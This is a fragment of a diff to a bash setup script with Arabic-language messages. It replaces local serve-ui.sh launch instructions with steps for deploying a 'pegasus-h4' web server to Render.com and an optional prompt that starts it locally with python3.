-    exec bash "$SCRIPT_DIR/pegasus-h4/serve-ui.sh" "$@"
-elif [ -f "$SCRIPT_DIR/serve-ui.sh" ]; then
-    exec bash "$SCRIPT_DIR/serve-ui.sh" "$@"
-else
-    echo "[!] Error: serve-ui.sh not found."
-    echo "    Run this script from the project root directory."
-    exit 1
-fi
-ROOTSERVEEOF
-chmod +x "serve-ui.sh"
+ok "✅ تم إنشاء خادم Render النهائي!"
 
-ok "تم إنشاء خادم الويب لخدمة الواجهة على بورت"
+# ============================================================
+# 13. خيار التشغيل المباشر
+# ============================================================
 echo ""
 echo "=========================================="
-echo -e "${GREEN}  ✓ كل شيء جاهز!${NC}"
+echo -e "${GREEN}  ✅ النظام جاهز للنشر على Render!${NC}"
 echo "=========================================="
 echo ""
-echo "  لتشغيل الواجهة مباشرة على بورت:"
+echo "  ☁️  للرفع إلى Render.com:"
 echo ""
-echo "    bash serve-ui.sh [PORT] [INTERFACE]"
+echo "  1. ارفع محتويات مجلد: render-deploy/"
+echo "     إلى مستودع GitHub منفصل"
 echo ""
-echo "  أمثلة:"
-echo "    bash serve-ui.sh              # http://0.0.0.0:8080"
-echo "    bash serve-ui.sh 3000         # http://0.0.0.0:3000"
-echo "    bash serve-ui.sh 80 127.0.0.1 # http://127.0.0.1:80"
+echo "  2. في Render Dashboard:"
+echo "     New + > Web Service"
+echo "     اختر المستودع"
+echo "     Start Command: python server.py"
 echo ""
-echo "  سيعمل حتى بدون Docker أو PostgreSQL!"
-echo "  (يستخدم بيانات وهمية للعرض عندما لا يكون الخادم متاحًا)"
+echo "  3. ✅ سيعمل فورًا على:"
+echo "     https://pegasus-h4.onrender.com"
 echo ""
-echo "  أو استخدم Docker للنسخة الكاملة:"
-echo "    cd pegasus-h4 && bash deploy.sh"
+echo "  🖥️  للتشغيل المحلي:"
+echo "    cd $PROJECT_DIR/render-deploy"
+echo "    python3 server.py"
+echo ""
+echo "  🌐  افتح: http://localhost:8080"
 echo "=========================================="
+
+# ============================================================
+# 14. تشغيل الخادم تلقائيًا
+# ============================================================
+echo ""
+echo -e "${CYAN}[*] هل تريد تشغيل الخادم الآن محليًا؟${NC}"
+echo "  اضغط Enter للتشغيل، Ctrl+C للإلغاء"
+read -p "  [Enter]: " -n 1 -s
+echo ""
+
+cd "$PROJECT_DIR/render-deploy"
+python3 server.py
